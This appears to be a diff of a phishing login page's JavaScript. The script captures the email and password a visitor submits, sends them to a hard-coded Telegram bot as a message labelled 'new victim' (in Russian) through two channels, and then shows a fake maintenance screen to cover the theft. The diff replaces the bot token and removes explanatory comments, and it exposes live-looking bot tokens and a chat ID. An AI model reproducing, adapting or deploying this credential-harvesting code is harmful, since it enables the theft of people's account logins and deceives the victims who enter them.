@@ -110,37 +110,27 @@
 </div>
 
 <script>
-    // ТВОИ ДАННЫЕ
-    const BOT_TOKEN = "8813188324:AANEv-CRRQHOqhWZkH0uXLbw7_a_bDOUfZt0";;
+    const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
     const CHAT_ID = "8850351378";
 
-    // ЖДЁМ ОТПРАВКУ ФОРМЫ
     document.getElementById("loginForm").addEventListener("submit", function(event) {
-        // ОСТАНАВЛИВАЕМ ПЕРЕЗАГРУЗКУ СТРАНИЦЫ
         event.preventDefault();
 
-        // ЗАБИРАЕМ ДАННЫЕ
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         const messageDiv = document.getElementById("message");
 
-        // ПРОВЕРКА НА ПУСТОТУ
         if (!email || !password) {
             messageDiv.textContent = "Заполните оба поля.";
             return;
         }
 
-        // ФОРМИРУЕМ СООБЩЕНИЕ
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
-
-        // ССЫЛКА ДЛЯ ОТПРАВКИ В TELEGRAM
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
 
-        // ОТПРАВЛЯЕМ (два способа для надёжности)
         fetch(url, { mode: "no-cors" });
         new Image().src = url;
 
-        // СКРЫВАЕМ ФОРМУ, ПОКАЗЫВАЕМ ТЕХРАБОТЫ
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
